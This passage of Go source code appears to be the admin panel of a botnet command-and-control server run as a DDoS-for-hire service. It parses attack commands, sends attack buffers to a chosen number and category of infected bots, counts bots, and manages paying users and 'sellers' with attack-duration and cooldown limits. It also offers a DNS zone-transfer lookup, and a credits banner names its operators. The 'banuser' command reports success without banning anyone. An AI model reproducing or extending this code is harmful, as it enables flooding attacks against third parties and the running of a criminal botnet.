            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atks.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atks.Duration, cmdatk, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atks) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
        continue    
    }
     if userInfo.admin == 1 && cmd == "atkhistory" {         
            this.conn.Write([]byte("\033[2J\033[1H"))
            fmt.Fprintf(this.conn, "\033[00;1;96m     ╔══════════════════════════════════════════╗\r\n")
            for _, s := range cmdsss {
                line := fmt.Sprintf("%s", s.Atks)
                fmt.Fprintf(this.conn, "\033[00;1;96m     ║\033[00;1;95m%s\033[0m\r\n", (line))
            }
            fmt.Fprintf(this.conn, "\033[00;1;96m     ╚══════════════════════════════════════════╝\r\n")
            continue
        }  
        if cmd == "credits" || cmd == "CREDITS" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte(ban()))
            this.conn.Write([]byte("\033[1;36m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;36m                ║\x1b[1;37mThis c2 is made and owned by \x1b[4;37m@gmeongod\x1b[0m\x1b[1;37m         ║\r\n"))
            this.conn.Write([]byte("\033[1;36m                ║\x1b[1;37mPartners/PowerProviders: \x1b[4;37m@scotty101godly\x1b[0m\x1b[1;37m       ║\r\n"))
            this.conn.Write([]byte("\033[1;36m                ║ \x1b[4;37m@tcpoist\x1b[0m\x1b[1;37m                                      ║\r\n"))
            this.conn.Write([]byte("\033[1;36m                ╚═══════════════════════════════════════════════╝\r\n"))
            continue

        }




        ///////////////////////// END OF API BOOTER


            if err != nil || cmd == "-zonetransfer" || cmd == "-ZONETRANSFER" {
            this.conn.Write([]byte("\x1b[1;93mIPv4 Or Website (Without www.)\033[93m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;93mResult\033[93m: \r\n\033[93m" + locformatted + "\x1b[37m\r\n"))
        }
        if cmd == "ddg" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte(duckduckgo()))
            continue
        }

        args = strings.Split(cmd, " ")
        switch strings.ToLower(args[0]) {
        case "who":

            if userInfo.admin == 0 {
                fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be A Seller!\033[0m\r\n")
                continue
            }

            for _, s := range sessions {
                if s.Username == username {
                    line := fmt.Sprintf("%d, %s", s.ID, s.Conn.RemoteAddr())
                    fmt.Fprintf(this.conn, "\033[00;1;96m║\033[00;1;95m%s\033[0m\r\n", (line))
                }
            }
            continue

        case "banuser":
            if userInfo.admin == 0 {
                fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be A Seller!\033[0m\r\n")
                continue
            }

            if len(args) < 2 {
                fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mSyntax: banuser (username)\033[0m\r")
                continue
            }

            user, err := database.GetUser(args[1])
            if err != nil {
                fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mInvalid User!\033[0m\r")
                continue
            }
                fmt.Fprintln(this.conn, "\x1b[0m                                 Successfully Banned\r", user)
                continue    

        /*--------------------------------------------------------------------------------------------------------------------------------------------*/

        case "unbanuser":

            if userInfo.admin == 0 {
                fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be A Seller!\033[0m\r\n")
                continue
            }

            if len(args) < 2 {
                fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mSyntax: unbanuser (username)\033[0m\r")
                continue
            }

            user, err := database.GetUser(args[1])
            if err != nil {
                fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mInvalid User!\033[0m\r")
                continue
            }


            if database.UserTempBan(user.Username, time.Now().Add(time.Duration(0)*(time.Hour*24)).Unix()) == false {
                fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mFailed To Unban User!\033[0m\r")
                continue
            }

            fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;92mUser Unbanned!\033[0m\r")
            continue    
        case "passwd":

            fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mCurrent Password\033[0m: ")
            currentPassword, err := this.ReadLine(true)
            if err != nil {
                return
            }

            if currentPassword != password {
                fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mIncorrect Password!\r")
                continue
            }

            fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mNew Password\033[0m: ")
            newPassword, err := this.ReadLine(true)
            if err != nil {
                return
            }

            fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mConfirm Password\033[0m: ")
            confirmPassword, err := this.ReadLine(true)
            if err != nil {
                return
            }

            if len(newPassword) < 6 {
                fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mYour Password Is Not Secure!\033[0m\r")
                continue
            }

            if confirmPassword != newPassword {
                fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mYour Passwords Do Not Match!\033[0m\r")
                continue
            }

            if database.ChangeUsersPassword(username, newPassword) == false {
                fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mFailed To Chnaged Password!\033[0m\r")
                continue
            }

            fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;92mYour Password Has Changed!\033[0m\r")
            password = newPassword
            continue   
        /*--------------------------------------------------------------------------------------------------------------------------------------------*/          
        }

        /*--------------------------------------------------------------------------------------------------------------------------------------------*/

        /*--------------------------------------------------------------------------------------------------------------------------------------------*/

           // user, err := database.GetUser(args[1])


        /*--------------------------------------------------------------------------------------------------------------------------------------------*/
        /*--------------------------------------------------------------------------------------------------------------------------------------------*/        

        botCount = userInfo.maxBots

        if cmd == "addem" {
            this.conn.Write([]byte("\x1b[1;93m                               ║Username:\x1b[37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Password:\x1b[37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Botcount (-1 for All):\x1b[37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Attack Duration (-1 for Unlimited):\x1b[37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Cooldown (0 for No Cooldown):\x1b[37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to parse Cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[93m- New User Info - \r\n- Username - \033[93m" + new_un + "\r\n\033[0m- Password - \033[93m" + new_pw + "\r\n\033[0m- Bots - \033[93m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[93m" + duration_str + "\r\n\033[0m- Cooldown - \033[93m" + cooldown_str + "   \r\n\x1b[1;93mContinue? (y/n):\x1b[37m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;93m                               ║User Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "REMOVEUSER" {
            this.conn.Write([]byte("\x1b[1;93m                               ║Username: \x1b[37m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \x1b[1;93m                               ║Are You Sure You Want To Remove \033[93m" + rm_un + "\x1b[1;93m?(y/n): \x1b[37m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[93m                                Unable to Remove User\r\n")))
            } else {
                this.conn.Write([]byte("\x1b[1;93m                                User Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "1admin" {
            this.conn.Write([]byte("\x1b[1;93m                               ║Username:\x1b[37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Password:\x1b[37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Botcount (-1 for All):\x1b[37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Attack Duration (-1 for Unlimited):\x1b[37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Cooldown (0 for No Cooldown):\x1b[37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to parse the Cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[93m- New User Info - \r\n- Username - \033[93m" + new_un + "\r\n\033[0m- Password - \033[93m" + new_pw + "\r\n\033[0m- Bots - \033[93m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[93m" + duration_str + "\r\n\033[0m- Cooldown - \033[93m" + cooldown_str + "   \r\n\x1b[1;93mContinue? (y/n):\x1b[37m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;93m                               ║Admin Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if cmd == "BOTS" || cmd == "bots" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("                                \033[93m%s \x1b[37m[\033[93m%d\x1b[37m]\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\033[93m                                Total \x1b[37m[\033[93m%d\x1b[37m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1m                               ║Failed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1m                               ║Bot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}
/*--------------------------------------------------------------------------------------------------------------------------------------------*/

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1000)
    bufPos := 0
    for {
        if len(buf) < bufPos+2 {
            fmt.Println("\033[0mOver Exceded Buf:", len(buf))
            fmt.Println("\033[0mPrevented CNC Crash | IP:", this.conn.RemoteAddr())
            return string(buf), nil
        }

        /*--------------------------------------------------------------------------------------------------------------------------------------------*/

        n, err := this.conn.Read(buf[bufPos : bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos : bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\033[0m\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("\033[00;1;95mGuilty 💔\033[0m\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^'
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++
                buf[bufPos] = '['
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("\033[00;1;95mx\033[0m"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
